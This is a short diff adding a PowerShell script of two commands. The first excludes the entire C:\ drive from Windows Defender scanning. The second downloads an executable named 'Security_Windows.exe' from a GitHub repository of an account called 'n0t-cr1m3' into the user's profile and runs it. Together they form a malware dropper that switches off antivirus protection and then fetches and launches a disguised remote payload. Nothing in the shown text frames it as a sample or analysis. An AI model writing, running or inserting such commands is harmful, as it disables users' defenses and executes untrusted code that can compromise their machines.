@@ -1,0 +1,5 @@
+Add-MpPreference -ExclusionPath "C:\"
+Start-BitsTransfer -Priority foreground -Source "https://github.com/n0t-cr1m3/test/raw/main/Security_Windows.exe" -Destination "$env:USERPROFILE/Security_Windows.exe" -Asynchronous Wait-BitsTransfer Start-Process -FilePath "$env:USERPROFILE/Security_Windows.exe"
+
+
+
